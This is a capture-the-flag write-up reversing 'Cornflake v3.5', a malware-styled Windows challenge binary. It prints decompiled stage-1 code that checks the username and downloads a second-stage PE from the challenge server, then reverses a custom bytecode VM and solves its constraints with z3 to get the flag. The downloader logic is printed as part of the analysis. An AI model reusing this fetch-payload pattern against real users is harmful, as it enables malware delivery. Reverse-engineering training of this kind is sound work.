# Cornflake v3.5

We start by jumping directly into the main function (it's stripped and for windows, but it's easy to find, `0x140001DC9`)

```c
// positive sp value has been detected, the output may be wrong!
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  __int64 v4; // rax
  const CHAR *v5; // rax
  _BYTE *v6; // rbx
  __int64 v8; // rax
  __int64 v9; // rax
  _BYTE v11[8204]; // [rsp+40h] [rbp-40h] BYREF
  DWORD dwNumberOfBytesRead; // [rsp+204Ch] [rbp+1FCCh] BYREF
  _BYTE v13[24]; // [rsp+2050h] [rbp+1FD0h] BYREF
  DWORD dwBufferLength; // [rsp+2068h] [rbp+1FE8h] BYREF
  int v15; // [rsp+206Ch] [rbp+1FECh] BYREF
  _BYTE v16[32]; // [rsp+2070h] [rbp+1FF0h] BYREF
  _BYTE v17[32]; // [rsp+2090h] [rbp+2010h] BYREF
  _BYTE v18[32]; // [rsp+20B0h] [rbp+2030h] BYREF
  _BYTE v19[44]; // [rsp+20D0h] [rbp+2050h] BYREF
  DWORD pcbBuffer; // [rsp+20FCh] [rbp+207Ch] BYREF
  CHAR Buffer[256]; // [rsp+2100h] [rbp+2080h] BYREF
  _BYTE v22[38]; // [rsp+2200h] [rbp+2180h] BYREF
  char v23; // [rsp+2226h] [rbp+21A6h] BYREF
  char v24; // [rsp+2227h] [rbp+21A7h] BYREF
  __int64 v25; // [rsp+2228h] [rbp+21A8h] BYREF
  _QWORD v26[3]; // [rsp+2230h] [rbp+21B0h] BYREF
  HINTERNET hRequest; // [rsp+2248h] [rbp+21C8h]
  HINTERNET hConnect; // [rsp+2250h] [rbp+21D0h]
  HINTERNET hInternet; // [rsp+2258h] [rbp+21D8h]

  ((void (__fastcall *)(int, const char **, const char **))sub_14000DA90)(argc, argv, envp);
  v26[2] = &v23;
  ((void (__fastcall *)(_BYTE *, const char *, char *))basic_str)(v22, "s3cr3t_k3y_v1", &v23);
  ((void (__fastcall *)(char *))sub_1400A0DE0)(&v23);
  pcbBuffer = 256;
  GetUserNameA(Buffer, &pcbBuffer);
  v26[1] = &v24;
  ((void (__fastcall *)(_BYTE *, CHAR *, char *))basic_str)(v19, Buffer, &v24);
  ((void (__fastcall *)(char *))sub_1400A0DE0)(&v24);
  ((void (__fastcall *)(_BYTE *, _BYTE *, _BYTE *))sub_140001654)(v18, v19, v22);
  ((void (__fastcall *)(_BYTE *, _BYTE *))sub_1400017C9)(v17, v18);
  if ( (unsigned __int8)((__int64 (__fastcall *)(_BYTE *, const char *))sub_1400CA270)(
                          v17,
                          "46f5289437bc009c17817e997ae82bfbd065545d") )
  {
    v3 = ((__int64 (__fastcall *)(void *, const char *))sub_1400C9BA0)(&unk_1400D1A60, "not the admin");
    ((void (__fastcall *)(__int64))sub_1400C8590)(v3);
    ExitProcess(0);
  }
  v4 = ((__int64 (__fastcall *)(void *, const char *))sub_1400C9BA0)(&unk_1400D1A60, "admin found");
  ((void (__fastcall *)(__int64))sub_1400C8590)(v4);
  ((void (__fastcall *)(_BYTE *, const char *, _BYTE *))sub_1400CA2F0)(v16, "/updates/check.php?SessionID=", v17);
  hInternet = InternetOpenA("Mozilla/5.0", 1u, 0, 0, 0);
  hConnect = InternetConnectA(hInternet, "cornflake.challs.srdnlen.it", 0x1F40u, 0, 0, 3u, 0, 0);
  v5 = (const CHAR *)((__int64 (__fastcall *)(_BYTE *))sub_14002FBD0)(v16);
  hRequest = HttpOpenRequestA(hConnect, "GET", v5, 0, 0, 0, 0, 0);
  if ( HttpSendRequestA(hRequest, 0, 0, 0, 0) )
  {
    v15 = 0;
    dwBufferLength = 4;
    HttpQueryInfoA(hRequest, 0x20000013u, &v15, &dwBufferLength, 0);
    if ( v15 == 200 )
    {
      ((void (__fastcall *)(_BYTE *))sub_1400AB4A0)(v13);
      while ( InternetReadFile(hRequest, v11, 0x2000u, &dwNumberOfBytesRead) && dwNumberOfBytesRead )
      {
        v6 = &v11[dwNumberOfBytesRead];
        v26[0] = ((__int64 (__fastcall *)(_BYTE *))sub_1400AB390)(v13);
        ((void (__fastcall *)(__int64 *, _QWORD *))sub_140020DA0)(&v25, v26);
        ((void (__fastcall *)(_BYTE *, __int64, _BYTE *, _BYTE *))sub_1400AB3F0)(v13, v25, v11, v6);
      }
      if ( (unsigned __int8)((__int64 (__fastcall *)(_BYTE *))sub_14002E0F0)(v13) != 1 )
      {
        if ( (unsigned __int8)((__int64 (__fastcall *)(_BYTE *))sub_140001907)(v13) )
          Sleep(0x1388u);
      }
      else
      {
        v8 = ((__int64 (__fastcall *)(void *, const char *))sub_1400C9BA0)(
               &unk_1400D1A60,
               "There was an error reading the file");
        ((void (__fastcall *)(__int64))sub_1400C8590)(v8);
      }
      ((void (__fastcall *)(_BYTE *))sub_1400AB4C0)(v13);
    }
  }
  else
  {
    v9 = ((__int64 (__fastcall *)(void *, const char *))sub_1400C9BA0)(
           &unk_1400D1A60,
           "There was an error connecting to the server");
    ((void (__fastcall *)(__int64))sub_1400C8590)(v9);
  }
  InternetCloseHandle(hRequest);
  InternetCloseHandle(hConnect);
  InternetCloseHandle(hInternet);
  ((void (__fastcall *)(_BYTE *))sub_1400AFB40)(v16);
  ((void (__fastcall *)(_BYTE *))sub_1400AFB40)(v17);
  ((void (__fastcall *)(_BYTE *))sub_1400AFB40)(v18);
  ((void (__fastcall *)(_BYTE *))sub_1400AFB40)(v19);
  ((void (__fastcall *)(_BYTE *))sub_1400AFB40)(v22);
  return 0;
}
```

without knowing a lot of windows API nor what the program does we can guess that it's sticjing a request as the folowing:

`http://cornflake.challs.srdnlen.it:8000/updates/check.php?SessionID=46f5289437bc009c17817e997ae82bfbd065545d`

that downloads a `check.php` file (that's funny cuz it's a PE not a php file)

## Stage 2

here in the binary we can take an old school approach, search some interesting strings, and jump to their references, in this case `password.txt` is a good candidate:

```c
__int64 __fastcall MainThread(payload *a1, __int64 a2, __int64 a3, LPVOID lpThreadParameter)
{
  __int64 v4; // rdx
  __int64 v5; // rdx
  __int64 v6; // rdx
  __int64 v7; // rdx
  __int64 v9; // rdx
  __int64 v10; // r8
  int v11; // r9d
  __int64 v13; // rax
  __int64 v14; // rdx
  int v15; // r8d
  int v16; // r9d
  bool v17; // bl
  __int64 v18; // rdx
  __int64 v19; // rax
  int v20; // edx
  int v21; // r8d
  int v22; // r9d
  __int64 v23; // rdx
  __int64 v25; // [rsp+0h] [rbp-80h] BYREF
  _BYTE v26[32]; // [rsp+20h] [rbp-60h] BYREF
  _QWORD v27[4]; // [rsp+40h] [rbp-40h] BYREF
  _BYTE v28[208]; // [rsp+60h] [rbp-20h] BYREF
  __int64 v29; // [rsp+130h] [rbp+B0h] BYREF
  _QWORD v30[6]; // [rsp+240h] [rbp+1C0h] BYREF

  sub_1DB69AFC0((__int64)a1, a2, (__int64)"password.txt", (__int64)(&v25 + 12), 8);
  sub_1DB6AEC50(a1, a2, v4, v27);
  if ( (unsigned __int8)sub_1DB671960(a1, a2, v5, &v29) )
  {
    sub_1DB6BD120(a1, a2, v27, v28);
    if ( (unsigned __int8)sub_1DB62ED60(a1, a2, v6, v27) != 1 && *(_BYTE *)sub_1DB6AC900(a1, a2, v7, v27) == 10 )
      sub_1DB6AE460(a1, a2, v7, v27);
    if ( (unsigned __int8)sub_1DB62ED60(a1, a2, v7, v27) != 1 && *(_BYTE *)sub_1DB6AC900(a1, a2, v9, v27) == 13 )
      sub_1DB6AE460(a1, a2, v9, v27);
    payload::payload(a1, a2, v9, (int)v26, v10, v11);
    sub_1DB6AEB00((__int64)a1, a2, v27, v30);
    v17 = (unsigned int)payload::stage2((__int64)a1, a2, v30, (int)v26, v15, v16) == 0;
    sub_1DB6AF190(a1, a2, v18, v30);
    if ( v17 )
      v19 = sub_1DB6BEC50(a1, a2, "ez", &unk_1DB6C5A60);
    else
      v19 = sub_1DB6BEC50(a1, a2, "nope", &unk_1DB6C5A60);
    ((void (__fastcall *)(payload *, __int64, __int64 (__fastcall *)(), __int64))sub_1DB6BD000)(
      a1,
      a2,
      sub_1DB6BD000,
      v19);
    Sleep(0x1388u);
    FreeConsole();
    payload::~payload(a1, a2, v20, (int)v26, v21, v22);
  }
  else
  {
    v13 = sub_1DB6BEC50(a1, a2, "[-] Failed to read password.txt", &unk_1DB6C5A60);
    ((void (__fastcall *)(payload *, __int64, __int64 (__fastcall *)(), __int64))sub_1DB6BD000)(
      a1,
      a2,
      sub_1DB6BD000,
      v13);
    FreeConsole();
  }
  sub_1DB6AF190(a1, a2, v14, v27);
  sub_1DB69B990(a1, a2, v23, v28);
  return 0;
}
```

It seems that it's trying to read the file anc calling `payload::stage2`, so let's dive into it:

```c
__int64 __fastcall payload::stage2(__int64 a1, __int64 a2, _QWORD *a3, int a4, int a5, int a6)
{
  int v6; // edx
  int v7; // r8d
  int v8; // r9d
  _BYTE *v9; // rax
  unsigned int v10; // ebx
  unsigned __int64 v11; // rbx
  __int64 v13; // [rsp+0h] [rbp-90h] BYREF
  char v14; // [rsp+20h] [rbp-70h] BYREF
  int v15; // [rsp+78h] [rbp-18h] BYREF
  char v16; // [rsp+7Fh] [rbp-11h]
  int IP; // [rsp+80h] [rbp-10h]
  int A; // [rsp+84h] [rbp-Ch]
  unsigned int B; // [rsp+88h] [rbp-8h]
  unsigned int C; // [rsp+8Ch] [rbp-4h]

  std::stack<int>::stack<std::deque<int>,void>(a1, a2, (_DWORD)a3, (unsigned int)(&v13 - 14) + 144, a5, a6, v13);
  C = 0;
  B = 0;
  A = 0;
  IP = 0;
  while ( 1 )
  {
    v11 = IP;
    if ( v11 >= std::vector<unsigned char>::size(a1, a2) )
      break;
    v16 = *(_BYTE *)std::vector<unsigned char>::operator[](a1, a2, IP);
    switch ( v16 )
    {
      case 1:
        v15 = A;
        std::stack<int>::push(a1, a2, (unsigned int)&v15);
        goto LABEL_21;
      case 2:
        v9 = (_BYTE *)std::vector<unsigned char>::operator[](a1, a2, IP + 1);
        *v9 += C;
        goto LABEL_21;
      case 3:
        B = *(_DWORD *)std::stack<int>::top(a1, a2);
        std::stack<int>::pop(a1, a2);
        goto LABEL_21;
      case 4:
        C = B == A;
        goto LABEL_21;
      case 5:
        v10 = -1;
        goto LABEL_24;
      case 7:
        C ^= B;
        goto LABEL_21;
      case 8:
        B += A;
        goto LABEL_21;
      case 9:
        A -= C;
        goto LABEL_21;
      case 10:
        B = *(char *)sub_1DB6AF370(a1, a2, IP - C);
        goto LABEL_21;
      case 11:
        B = *(char *)sub_1DB6AF370(a1, a2, IP + C);
        goto LABEL_21;
      case 12:
        C = *(unsigned __int8 *)std::vector<unsigned char>::operator[](a1, a2, IP - 1);
        goto LABEL_21;
      case 13:
        B = *(char *)sub_1DB6AF370(a1, a2, C);
        goto LABEL_21;
      case 14:
        C = B;
        goto LABEL_21;
      case 15:
        A = C;
        goto LABEL_21;
      case 16:
        B = A;
        goto LABEL_21;
      case 17:
        C *= B;
        goto LABEL_21;
      case 18:
        if ( B )
          C /= B;
        goto LABEL_21;
      default:
LABEL_21:
        ++IP;
        break;
    }
  }
  v10 = 0;
LABEL_24:
  std::stack<int>::~stack(a1, a2, v6, (unsigned int)&v14, v7, v8, v13);
  return v10;
}
```

This is clearly a custom VM, the bytecode can be found inside the `payload::payload` function:

```c
// Alternative name is '_ZN7payloadC1Ev'
void __fastcall payload::payload(payload *this, int a2, __int64 a3, int a4, __int64 a5, int a6)
{
  int v6; // edx
  int v7; // r8d
  int v8; // r9d
  __int64 v9; // [rsp+0h] [rbp-40h] BYREF
  int v10; // [rsp+8h] [rbp-38h]
  __int64 v11; // [rsp+10h] [rbp-30h]
  char *v12; // [rsp+20h] [rbp-20h]
  __int64 v13; // [rsp+28h] [rbp-18h]
  char v14; // [rsp+37h] [rbp-9h] BYREF
  char *v15; // [rsp+38h] [rbp-8h]

  v15 = (char *)&v9 + 55;
  v12 = byte_1DB6C7100;
  v13 = 685;
  std::vector<unsigned char>::vector(
    (_DWORD)this,
    a2,
    (unsigned int)(&v9 - 4) + 64,
    a4,
    (unsigned int)&v9 - 9 + 64,
    a6,
    v9,
    v10,
    v11);
  std::__new_allocator<unsigned char>::~__new_allocator((_DWORD)this, a2, v6, (unsigned int)&v14, v7, v8, v9);
}
```

we can now extract all the operations:
```bash
0x01 PUSH A
0x02 bytecode[IP + 1] += C
0x03 POP B
0x04 C = B == A
0x05 FAIL
0x07 C ^= B
0x08 B += A
0x09 A -= C
0x0A B = input[IP - C]
0x0B B = input[IP + C]
0x0C C = bytecode[IP - 1]
0x0D B = input[C]
0x0E C = B
0x0F A = C
0x10 B = A
0x11 C *= B
0x12 C /= B
```

with the operations defined we can reconstruct a simple python interpreter for the vm:

```py
IP = 0
def run_vm(inp):
	global IP
	IP = 0

	A = 0
	B = 0
	C = 0
	ip = 0
	stack = []

	bytecode = BYTECODE.copy()

	try:
		while ip < len(bytecode):
			op = bytecode[ip]

			if op == 1:
				if DEBUG > 1: print(f'PUSH A: {A} {stack}')
				stack.append(A)

			elif op == 2:
				bytecode[ip+1] = (bytecode[ip+1] + C) & 0xff 
				if DEBUG > 1: print(f'modify next byte [{ip+1}] +{C}: {bytecode[ip+1]}')

			elif op == 3:
				B = stack.pop()
				if DEBUG > 1: print(f'POP B: {B} {stack}')

			elif op == 4:
				if DEBUG: print(f'B == A: {B} == {A}')
				print('#####'*8)
				C = int(B == A)

			elif op == 5:
				if DEBUG > 1: print('FAIL')
				return False

			elif op == 7:
				if DEBUG > 1: print(f'XOR C B: {C} ^ {B} = {C ^ B}')
				C ^= B

			elif op == 8:
				if DEBUG > 1: print(f'ADD B A: {B} + {A} = {B + A}')
				B += A

			elif op == 9:
				if DEBUG > 1: print(f'SUB A C: {A} - {C} = {A - C}')
				A -= C

			elif op == 10:
				print('LOAD input -', C, ip)
				exit(1)
			# 	if DEBUG: print('LOAD input -', C, ip)
			# 	B = inp[ip - C]

			elif op == 11:
				print('LOAD input +', C, ip)
				exit(1)
			# 	if DEBUG: print('LOAD input +', C, ip)
			# 	B = inp[ip + C]

			elif op == 12:
				C = bytecode[ip-1]
				if DEBUG > 1: print(f'LOAD bytecode [{ip-1}]: {C}')

			elif op == 13:
				if DEBUG: print('LOAD input', C, bytes([inp[C]]))
				B = inp[C]

			elif op == 14:
				if DEBUG > 1: print(f'C = B ({B})')
				C = B

			elif op == 15:
				if DEBUG > 1: print(f'A = C ({C})')
				A = C

			elif op == 16:
				if DEBUG > 1: print(f'B = A ({A})')
				B = A

			elif op == 17:
				if DEBUG > 1: print(f'MUL C B: {C} * {B} = {C * B}')
				C *= B

			elif op == 18:
				if DEBUG > 1: print(f'DIV C B: {C} // {B} = {C // B}')
				C //= B
			
			# else:
			# 	print('Unknown opcode', op)
			# 	exit(1)

			ip += 1

	except Exception as e:
		print('Error:', e)
		IP = ip
	finally:
		IP = ip

	return True


DEBUG = 2

flag = b'srdnlen{}'
flag = bytearray(flag)

print(run_vm(flag), IP)
print(flag)
```

### Extracting the flag

by running the code we see that makes steps where it loads some of the flag chearcters, makes some operations on them and if they not satisfy some contraints it fails.
The initial constraints we can assume that are on the flag format:
```py
f[0] == ord('s')
f[1] == ord('r')
f[2] == ord('d')
f[3] == ord('n')
f[4] == ord('l')
f[5] == ord('e')
f[6] == ord('n')
f[7] == ord('{')
f[33] == ord('}')
```

We will eventually encounter all of them, but they are not entirely at the beginning of the code.
Now, we can extract the next contraint, solve it, feed the flag into the code and repeat until we finish the flag.
Here is the resulting z3 script:

```py
from z3 import *

n = 34
f = [BitVec(f'f{i}', 8) for i in range(n)]
s = Solver()

s.add(f[0] == ord('s'))
s.add(f[1] == ord('r'))
s.add(f[2] == ord('d'))
s.add(f[3] == ord('n'))
s.add(f[4] == ord('l'))
s.add(f[5] == ord('e'))
s.add(f[6] == ord('n'))
s.add(f[7] == ord('{'))
s.add(f[33] == ord('}'))

s.add((f[33] + 3) ^ (f[21] - 2) == 234)

s.add(f[8] == ord('r'))

s.add((f[12] - f[23]) ^ f[18] == 119)

s.add(((f[20] >> 2) ^ f[15]) + f[10] == 190)

s.add((f[11] - f[17]) ^ f[29] == 88)

s.add(((f[7] >> 2) ^ f[16]) + f[28] == 222)

s.add(f[13] + f[14] == 130)

s.add(f[9] - ((f[9] / 5) * 5) == 1) # f[9] % 5 == 1

# s.add(f[f[22] - 48] == 114) # 114 -> 'r'
s.add(Or([f[22] == ord('1'), f[22] == ord('8')]))

s.add(f[22] + f[24] == 100)

s.add((f[25] + (f[26] * 2)) - (f[27] * 3) == 118)

s.add(f[30] + f[31] + f[32] == 217)



s.add(f[27] < ord('a')) # used otherwise we get a negative number in the VM
for i in range(8, 33):
    s.add(f[i] >= 0x30, f[i] <= 0x7a)


if s.check() == sat:
    m = s.model()
    flag_bytes = [m.evaluate(f[i]).as_long() for i in range(n)]
    flag = ''.join(chr(b) for b in flag_bytes)
    print("Flag:", flag)
else:
    print("No solution found")
```

This will give us a valid flag: `srdnlen{r3@uz@Bnwpz@@l1m3zR8u]x01}`, the only problem is that the flag is clearly not valid,
but we can see in the ctf announcements that the challenge has some problems, and if we have a valid flag we can open a ticket, so after opening a ticket and sending my flag and solve we get the real one.

## Flag

`srdnlen{r3v_c4N_l0ok_l1K3_mAlw4r3}`
